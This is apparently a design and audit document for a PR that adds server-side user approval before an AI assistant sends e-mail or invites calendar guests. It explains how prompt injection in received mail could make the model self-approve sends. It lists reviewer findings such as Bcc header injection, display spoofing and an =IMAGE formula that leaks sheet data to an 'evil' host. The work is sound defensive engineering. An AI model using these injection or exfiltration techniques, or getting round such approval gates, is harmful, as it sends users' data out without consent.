# Server-side approval for irreversible actions (audit finding F09)

`send_email`, `reply_email` and `forward_email` used to be guarded by `input.user_confirmed === true`. That value is an
argument **the model supplies**, so it is not evidence that the user agreed to anything (prompt injection in a received
e-mail can make the model set it). `create_calendar_event` with guests had no guard at all: "Confirm first" was only a
sentence in the tool description and the system prompt. The first version of this branch (HMAC tokens) did not close F09 either: no Confirm UI,
no single use, and `legacy` was the default.

**Nothing here was applied to any live database or deployment.**

## Design

```
model calls send_email / reply_email / forward_email / create_calendar_event (with attendees)   nothing is sent or created
  -> runTool -> gateIrreversible        stores the exact, normalized arguments in public.approval_requests (service role only)
  -> SSE {status:"approval_required", approval:{id, action, fields, context, expires_at}}
  -> <ApprovalTray> shows a Confirm card: To / Cc / Bcc / Subject / body (or Event / When / Where / Guests / description)
     as plain text, countdown, Confirm, Cancel
  -> POST /api/approve-action {id, decision}   (Bearer = the signed-in user's Supabase token)
       approve: one atomic  DELETE ... WHERE id AND user_id AND expires_at > now() RETURNING
                -> executes the STORED arguments (never anything from the request) -> Gmail / Google Calendar
       reject : same DELETE, nothing is executed
```

**What is gated.** `send_email`, `reply_email`, `forward_email`, and `create_calendar_event` **when it has at least one guest**. The gate and the executor use the same definition of "guest" (`attendeeEntries()`: an array entry with an address, exactly what `createCalendarEvent()` would send to Google), so an event the executor would invite people to can never slip through as "no guests". An event without guests (only the user) is created immediately as before. Guests are stored as unique, trimmed, lower-case addresses (max 20, validated; objects are reduced to the address, so extra properties such as `organizer` cannot be smuggled in); `start`/`end` must parse. A bad value is refused when the model asks, not after the user pressed Confirm.

| Property | How it holds |
|----------|--------------|
| The model cannot send | In `server` mode (the default) `gateIrreversible` never returns "proceed". `user_confirmed` is ignored. The tool result says `NOT SENT YET`, so the model is told not to claim it was sent. |
| The user approves what is executed | The card shows the stored fields; the endpoint executes the stored row, not request data. A request body carrying `args` changes nothing (tested). A digest recheck (`corrupt`) discards a row altered in the store; unknown fields in a stored row are dropped. |
| Single use / at most once | The row is consumed by the same `DELETE ... RETURNING` that releases it: double click, replay and two tabs give exactly one winner. If Gmail then fails, the request is **not** retried; the user asks again. The UI says so honestly (a network error says "may or may not have been sent: check your Sent folder"). |
| Bound to the user | `user_id` is in the `WHERE`. Another signed-in user gets 404. |
| Short lived, bounded | 10 min TTL, max 10 open requests per user (creations of one user are queued in the process, so parallel tool calls cannot exceed it; several server instances serving one user at the same moment still can, by a few), identical open requests are reused instead of stacked, rows expired for more than 1 h are removed. |
| Not a CSRF target | No CORS headers; authentication is a bearer header, not a cookie. POST only; 30 requests/min/user. |
| Fail closed | No user, no streaming client (the card cannot be shown), card delivery failure, missing table, invalid arguments (including a malformed guest address), unknown `APPROVAL_MODE`: all block with `is_error` and store nothing that could later be released without a card. |
| The card shows what is sent | Every single-line field (recipients, subject, summary, location, ...) is refused if it contains a control character (CR/LF included), a bidi override or an invisible joiner; recipients must be plain ASCII addresses (a display name that contains an address is refused); the MIME encoders also strip line breaks from header values. An independent review found that a subject with `\r\nBcc: ...` used to reach Gmail as a real Bcc header while the card showed an empty Bcc: fixed and covered by end-to-end tests that compare the card with the MIME handed to Gmail. |
| Reply and forward show the real recipients | No card is created unless the received message can be read; the card shows To, Cc (reply-all expansion included) and Bcc computed by the same function the send uses. A `From` header that names several addresses is refused. This relies on the headers of a delivered message not changing between the card and the send (UNVERIFIED against Gmail, believed true). |
| Content is not kept or logged | The row is deleted when the user decides. Audit log lines carry `id`, action and digest only; provider error text is reduced to the HTTP code. |
| No script injection | The body is rendered as text in a `<pre>`; no `innerHTML`. |

## Configuration

| Variable | Meaning |
|----------|---------|
| `APPROVAL_MODE` unset / `server` | Default. Everything above. |
| `APPROVAL_MODE=legacy` | **Emergency switch only.** The old behaviour: the model's own `user_confirmed === true` releases the action (F09 open). Every release is logged: `[approval] APPROVAL_MODE=legacy ... (F09 open)`. |
| any other value | Blocks all three actions. |

No new secret is needed (the earlier `APPROVAL_SECRET` is gone).

## Evidence

* `npm test`: 87 tests (approval store, gate, endpoint, real `runTool` with Gmail, Supabase and the Calendar API stubbed at `fetch` level, **end-to-end mail tests with the real MIME encoders** that compare the card with the message handed to Gmail, a **tool inventory** that fails when a tool is added without being classified, static wiring of chat stream / tool schemas / system prompt / SQL constraint / front end). No test sends anything. The calendar tests check that an event with guests never reaches the Calendar API before Confirm, that after Confirm Google receives exactly the stored, normalized guests, and that an event without guests is created immediately with no `attendees` field.
* Mutation check on this branch's code: 82 seeded faults (62 earlier + 20 for the review fixes), 79 caught. The three survivors are equivalent: `digest ignores action` (field sets differ per action, so two actions can never produce the same canonical arguments) and `no-user check removed` (`createPending` rejects an empty user id before any database call) and `invalid args let through` in the gate's second `invalid_args` branch (arguments are now validated before that point, so the branch is only a defensive message). Two more candidate mutants were dropped as equivalent by behaviour (the lazy admin-client getter and the unused describe hook for events).
  Surviving mutants found weak spots that were fixed: a test asserting nothing about database calls for malformed ids, no assertion that a non-interactive call stores no orphan row, no test of extra stored fields, and **a real leak: the provider error text (which can echo the message) was written to the server log** (now only the HTTP code).
* Browser check (Chromium, Playwright, phone width 390 px, light and dark): 26/26 checks for mail cards (including the reply card with resolved To/Cc/Bcc, the body-size line, a 504 answer, and a reply card without recipients that warns) and 14/14 for event cards (the event run predates the review fixes and was not repeated; the event card was not changed). Cards render an HTML/`<script>` body, summary or description as text with no side effect; Confirm and Cancel are disabled while a request is in flight; a double click sends one POST; the POST body is exactly `{id, decision}` with the bearer token; sent / created / failed / expired / cancelled / network-error states; the countdown disables Confirm at 0; no horizontal scroll. This used the card component with the endpoint stubbed, **not** the whole app signed in against Supabase, Gmail and Calendar.
* Real PostgreSQL 16.15 with Supabase-like roles (throwaway cluster, re-created for the final SQL): `approval-requests.sql` applies twice without error and `verify-approval-requests.sql` returns `0 failing of 20`; an **upgrade** from the previous version of the script (table with the 3-action constraint and a row in it) keeps the row, replaces the constraint, and then accepts `create_calendar_event` while an unknown action is still rejected; `anon` and `authenticated` get `permission denied`; `service_role` can insert and read. Negative test of the verify script: `GRANT SELECT ... TO PUBLIC` -> `3 failing of 20`. Earlier, for the same `DELETE ... RETURNING` statement: 8 parallel releases of one row, 25 rounds, exactly one winner every round (not re-run for the calendar action: the statement is the same).
* `tsc -b` and `vite build` pass; CI runs `npm ci`, `npm test` and `npm run build`.

## Deployment order

The code fails closed, so the order cannot cause an unintended send, but it decides whether sending works:

1. Backup / point-in-time marker. Confirm which Supabase project the production site really uses (not verified, see below).
2. Run `supabase/approval-requests.sql` (3 s `lock_timeout`; re-run if it aborts on a lock; it also upgrades a table made by an earlier version of the script), then `supabase/verify-approval-requests.sql`: the last row must read `PASS`.
3. Deploy this branch. Smoke test with a test account: ask the assistant to send a mail to yourself, check that **nothing arrives before Confirm**, press Confirm once, check that it arrives once; press Cancel on another; let one expire. Then ask for a calendar event with one test guest you control: **no event and no invitation before Confirm**, one event after it; an event without guests is created at once.

| Situation | Result |
|-----------|--------|
| Code deployed **before** the SQL | Every send/reply/forward is blocked with "the approval store is unavailable (apply supabase/approval-requests.sql)". Nothing is sent, nothing else changes. |
| SQL applied before the code | Harmless: the table is unused. |
| Old front end + new API | The model's call is stored and the SSE event is ignored by the old UI: nothing can be confirmed, nothing is sent. |
| New front end + old API | The old API never emits the event; the tray stays empty. |

## Rollback

* Code: Vercel rollback to the previous deployment. The table can stay.
* `APPROVAL_MODE=legacy` re-opens F09 immediately without a deploy of old code. Use only knowingly, and only for a short time.
* `supabase/approval-requests-rollback.sql` drops the table. With the new code still deployed, sends are then blocked (fail closed).

## Independent review (2026-10-09)

A reviewer who had not seen this analysis tried to break the guarantee. The core gate held (37 attendee shapes fuzzed with 0 guests created without a card, replay, cross-user, expiry, mode parsing, CSRF, SQL grants read by eye). Findings and what was done:

| Finding | Severity | Status |
|---|---|---|
| Header injection: card shows an empty Bcc, Gmail receives a Bcc header | high | fixed (gate, recipient parsing, encoders), end-to-end tests |
| Reply recipients not pinned or shown when the best-effort lookup failed; reply-all expansion never shown | medium | fixed: no card without the original; card shows the resolved recipients |
| Pending cap bypassed by 40 parallel tool calls | low-medium | fixed in process (queue per user); cross-instance overshoot remains |
| Display spoofing: bidi override, homoglyphs, `"ceo@good.com" <evil@bad>`, hidden tail of a long body | low | fixed: refused/ASCII only; the card states the body length and scrolls |
| Subject required by Gmail but not by the gate (approval burned) | low | fixed |
| "Nothing was sent" shown for 5xx/unreadable answers | low | fixed wording |
| Gate result tested by truthiness; perform calls not awaited | info | fixed (`PROCEED` value, `await`) |
| Tests that would not notice: a hard-coded Bcc in the send branch, a UI that auto-approves, a new ungated `send_draft` tool | test quality | e2e tests, tool inventory and wiring checks added; 20 mutants for these |

Not changed, with reasons:

* `update_sheet` / `create_spreadsheet` write with `USER_ENTERED`, so a formula such as `=IMAGE("https://evil/?d=...")` could leak cell data when the owner opens the sheet (reasoned by the reviewer, **not executed**). `append_google_doc` can write into a document shared with other people. Both are reversible own-data writes, left immediate by design; the safer variant for sheets (`RAW`) changes behaviour (formulas stop working) and needs a product decision.
* `web_fetch` is a server-side GET; `cron/notes-reminders.js` mails the owner's own address with note text the model can write; `save_memory` lets injected text persist into later system prompts. Not outward-facing in the sense of this gate, but they are prompt-injection surfaces.
* The digest is an unkeyed SHA-256: it detects accidental corruption of a stored row, not an attacker with database write access (who could also change the row).
* `vercel.json` sets no `frame-ancestors`/CSP header (clickjacking of the Confirm button); pending cards stay in React state after sign-out (they expire in 10 minutes).
* Not verified by anyone: live Gmail behaviour with injected headers, browser rendering of the exact attack text, Sheets `IMAGE` exfiltration, Anthropic's `web_fetch` URL limits.

## Still open and not covered here

* `modify_gmail` trash (recoverable from Gmail's Trash, nothing leaves the account) and the daily digest cron (sent to the user's own address, composed by the server) do not go through this gate. `bulk_archive_gmail`, `update_sheet`, `append_google_doc` and similar writes are reversible and stay immediate, by design.
* Whether Google's Calendar API e-mails the guests when `sendUpdates` is not set was **not verified** (the documentation says no notification by default, "some emails might still be sent"). Either way the event, with its description, appears for the guests, which is why it needs the Confirm card.
* The 10 minute window is a choice: shorter is safer, longer is friendlier.
* A real end-to-end run (signed in, real Gmail, real Supabase) was not possible here. PostgREST behaviour of `delete().select().maybeSingle()` (one row, `PGRST116` on several) is inferred from its documentation and from the SQL semantics, not run.
* Production mapping and live RLS/policies are unverified (no access), same as in the connector-security PR.
